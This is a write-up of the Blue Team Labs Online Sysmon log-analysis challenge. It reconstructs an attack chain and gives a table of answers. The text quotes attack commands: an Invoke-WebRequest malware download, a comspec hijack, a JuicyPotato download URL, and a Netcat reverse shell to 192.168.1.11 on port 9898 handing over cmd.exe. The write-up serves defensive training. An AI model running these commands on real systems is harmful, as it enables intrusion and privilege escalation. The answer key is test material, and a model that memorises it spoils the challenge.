---
title: Log Analysis - Sysmon
platform: BTLO
category: Log Analysis
difficulty: Easy
skills: Sysmon event analysis, LOLBIN identification, privilege escalation tooling, PowerShell log review
---

# Log Analysis - Sysmon — Blue Team Labs Online

## Scenario
Given Sysmon logs from a compromised endpoint. The job was to reconstruct the attack from these logs alone — how the attacker got in, how they moved from initial access to running their own commands, what tooling they used, and how far they got.

## Objective
Trace the full chain from initial access through privilege escalation: the file that gave the attacker their foothold, how they pulled down their first piece of malware, how they hijacked command execution, what that malware actually did, what it downloaded next, and where it tried to establish a reverse shell.

## Methodology

**Initial access file**
Started by looking at process creation events (Sysmon Event ID 1) for anything unusual, then traced parent process IDs upward from the first suspicious PowerShell activity. That PowerShell process's parent was `mshta.exe`, running `updater.hta` — an HTA file, which is HTML that gets executed through the Microsoft HTML Application Host. That's the file that gave the attacker their initial foothold.

**Malware download cmdlet and port**
Following the PowerShell activity spawned from that HTA file, found an `Invoke-WebRequest` call pulling a file from the attacker's server. The request went out to port `6969`, fetching what would become the malware binary.

**Environment variable hijack**
Filtered for `comspec` in the logs and found the attacker had overwritten it to point to `C:\Windows\Temp\supply.exe` instead of the legitimate `cmd.exe`. Windows uses `comspec` to know what to launch when something needs a command interpreter — replacing it silently redirects every subsequent "run a shell command" action to the attacker's binary instead.

**LOLBIN used for execution**
With `comspec` hijacked, execution now routed through `supply.exe`, but the question was which legitimate Windows binary the attacker rode on top of to actually issue commands. Checking the process tree, `ftp.exe` — a signed, built-in Windows binary — was being invoked to carry out file transfer and execution actions, letting the attacker's activity blend into what looks like ordinary FTP usage.

**First command executed**
With `supply.exe` now standing in for the shell, filtered for the commands it ran and sorted by timestamp. The very first one was `ipconfig` — standard initial enumeration to check network configuration on the compromised host.

**Malware language**
Looked at what DLLs `supply.exe` pulled in as dependencies rather than trying to reverse the binary itself. It loaded `python27.dll` alongside `msvcr90.dll` (the Visual C++ 9.0 runtime) — the Python 2.7 dependency is the giveaway that the malware itself is Python code, most likely packaged into a standalone executable with a tool like PyInstaller (which explains the Visual C++ runtime dependency alongside it).

**New file download URL**
Continued filtering for `Invoke-WebRequest` activity further down the timeline and found a second download, this time pulling a known privilege-escalation tool directly from its public GitHub release: `https://github.com/ohpe/juicy-potato/releases/download/v0.1/JuicyPotato.exe`.

**Reverse shell port**
Found the command that actually launched JuicyPotato and read through its arguments carefully, since it has two ports in play: `-l 9999` sets JuicyPotato's own local COM listener (not the reverse shell), while `-p nc.exe -a "192.168.1.11 9898 -e cmd.exe"` is the actual payload — running Netcat to connect back out to `192.168.1.11` on port `9898` and hand over `cmd.exe`. That second port is the real reverse shell destination.

## Key Findings / IOCs

| # | Question | Answer |
|---|----------|--------|
| 1 | File that gave initial access | `updater.hta` |
| 2 | Download cmdlet and port | `Invoke-WebRequest`, port `6969` |
| 3 | Hijacked environment variable | `comspec` |
| 4 | LOLBIN used for execution | `ftp.exe` |
| 5 | First command executed | `ipconfig` |
| 6 | Malware language | Python (2.7) |
| 7 | Second file download URL | `https://github.com/ohpe/juicy-potato/releases/download/v0.1/JuicyPotato.exe` |
| 8 | Reverse shell port | `9898` |

## Lessons Learned
- `comspec` hijacking is a quiet but powerful persistence/execution trick — once it's overwritten, every process that asks Windows for "the" command interpreter gets handed the attacker's binary instead, without needing to touch any individual script or scheduled task.
- LOLBIN abuse (`ftp.exe` here) works precisely because the binary is signed, expected, and rarely flagged on its own — detection has to focus on behavior and context (unexpected parent process, unusual arguments) rather than the binary's identity alone.
- Malware dependency DLLs are a fast, low-effort way to fingerprint what a binary is built with, especially when reversing the binary itself isn't practical — `python27.dll` told the whole story here without needing to disassemble anything.
- Attackers pulling privilege-escalation tools straight from public GitHub releases (rather than hosting their own copy) is common and gives defenders a ready-made IOC — the URL itself, and the tool's known purpose, immediately raise the stakes of the investigation.
- When a command has multiple port arguments (as JuicyPotato's does here), it's worth reading the whole command line carefully rather than grabbing the first port number seen — the wrong one gives a technically-plausible but incorrect answer.
